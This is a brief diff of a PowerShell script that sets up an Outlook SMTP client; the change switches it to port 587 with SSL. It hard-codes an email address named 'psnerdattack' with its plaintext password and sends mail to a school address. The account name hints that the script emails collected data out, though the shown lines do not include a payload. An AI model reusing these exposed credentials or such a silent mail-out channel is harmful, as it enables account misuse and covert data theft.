@@ -2,8 +2,8 @@ $email = "psnerdattack@outlook.com"
 $pass = "gSCR7MjO8H9w"
 $smtpServer = "smtp-mail.outlook.com" 
 $msg = new-object Net.Mail.MailMessage 
-$smtp = new-object Net.Mail.SmtpClient($smtpServer, 25) 
-#$smtp.EnableSsl = $true 
+$smtp = new-object Net.Mail.SmtpClient($smtpServer, 587) 
+$smtp.EnableSsl = $true 
 $msg.From = "$email"
 $msg.To.Add("11182@elizabethcollege.gg") 
 $msg.BodyEncoding = [system.Text.Encoding]::Unicode 
